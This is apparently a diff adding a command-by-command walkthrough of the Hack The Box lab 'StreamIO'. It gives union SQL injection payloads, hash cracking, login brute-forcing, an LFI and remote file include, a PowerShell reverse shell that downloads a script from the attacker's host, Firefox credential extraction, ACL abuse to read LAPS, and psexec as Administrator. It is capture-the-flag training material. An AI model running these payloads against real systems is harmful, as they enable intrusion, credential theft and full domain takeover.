@@ -1,0 +1,153 @@
+#############################################
+# 🔹 HTB: StreamIO Walkthrough
+# Video: https://youtu.be/JgHjbwW-RhI
+#############################################
+
+
+#############################################
+# 1️⃣ Initial Enumeration
+#############################################
+
+# Nmap reveals vhost
+nmap -sC -sV -Pn -p- streamio.htb
+# Found: watch.streamio.htb
+
+# Fuzzing subdomains and directories
+ffuf -u https://watch.streamio.htb/FUZZ \
+     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 300
+
+ffuf -u https://watch.streamio.htb/FUZZ \
+     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300
+
+ffuf -u https://streamio.htb/FUZZ \
+     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 300
+
+ffuf -u https://streamio.htb/FUZZ \
+     -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 300
+
+# Discovered endpoints:
+# - https://streamio.htb/admin/master.php
+# - https://streamio.htb/login.php
+# - https://watch.streamio.htb/search.php
+
+
+#############################################
+# 2️⃣ SQL Injection (search.php)
+#############################################
+
+# Testing query logic
+# SELECT * FROM movies WHERE name LIKE '%input%'
+
+toy%' -- -
+toy%' union select 1,2,3,4,5,6 -- -
+
+# DB enumeration
+UNION SELECT 1,db_name(5),3 -- -
+UNION SELECT 1,(SELECT string_agg(concat(name,':',id),'|') FROM streamio..sysobjects WHERE type='u'),3 -- -
+
+# Column enumeration
+UNION SELECT 1,(SELECT string_agg(name,'|') FROM streamio..syscolumns WHERE id=<TABLE_ID>),3 -- -
+
+# Extracting credentials
+UNION SELECT 1,(SELECT string_agg(concat(username,':',password),'|') FROM users),3 -- -
+
+# Cleaning SQLi output in vim
+:%s/[ ]*//g
+:%s/|/\r/g
+
+# Crack MD5 hashes
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 0 hash.txt --show
+
+# Prepare creds for Hydra
+awk -F : '{print $1":"$3}' cracked.txt > userpass.txt
+
+
+#############################################
+# 3️⃣ Credential Stuffing & Login
+#############################################
+
+# No SMB access
+nxc smb $IP -u <user> -p <pass>
+
+# Brute force web login
+hydra -C userpass.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+
+# Found: yoshihide : 66boysandgirls..
+
+#############################################
+# 4️⃣ Exploitation: LFI / RCE
+#############################################
+
+# Debug parameter
+https://streamio.htb/admin/?debug=
+
+# LFI → php filter
+php://filter/read=convert.base64-encode/resource=index.php
+
+# Creds found: db_admin : B1@hx31234567890
+
+# RCE via file include
+POST /admin/?debug=master.php
+include=http://10.10.14.43:80/shell.php
+
+# Reverse shell
+stty raw -echo; (stty size; cat) | nc -nvlp 4444
+system('powershell -NoP -W Hidden -c "IEX(IWR http://10.10.14.43/con.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.43 4444"');
+
+
+#############################################
+# 5️⃣ MSSQL Enumeration
+#############################################
+
+# SQLCMD login
+sqlcmd -S localhost -U db_admin -P "B1@hx31234567890"
+
+select DB_NAME()
+go
+select name from sys.databases
+go
+
+use backup
+go
+SELECT * FROM information_schema.tables;
+go
+SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users';
+go
+SELECT username,password FROM users;
+
+# Found: nikk37:get_dem_girls2@yahoo.com
+
+
+#############################################
+# 6️⃣ Privilege Escalation
+#############################################
+
+# Firefox creds extraction
+C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
+  - key4.db
+  - logins.json
+
+python3 firepwd.py key4.db logins.json
+
+# Discovered creds
+JDgodd : JDg0dd1s@d0p3cr3@t0r
+
+# BloodHound / ACL abuse
+upload sharphound.exe
+# Found: JDgodd can read LAPS
+
+# You might need this
+#owneredit.py -action write -new-owner 'JDgodd' -target 'CORE STAFF' 'streamio.htb'/'jdgodd':'JDg0dd1s@d0p3cr3@t0r'
+
+dacledit.py -action write -rights WriteMembers -principal 'jdgodd' -target-dn 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB''streamio.htb'/'jdgodd':'JDg0dd1s@d0p3cr3@t0r'
+
+net rpc group addmem "CORE STAFF" "jdgodd" -U "streamio.htb"/"jdgodd"%"JDg0dd1s@d0p3cr3@t0r" -S dc.streamio.htb
+
+bloodyAD --host $IP -d dc.streamio.htb -u "jdgodd" -p JDg0dd1s@d0p3cr3@t0r get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+
+# Admin password recovered
+Administrator : '0V6B3}&!7O+Wg0'
+
+# Final shell
+impacket-psexec Administrator:'0V6B3}&!7O+Wg0'@$IP
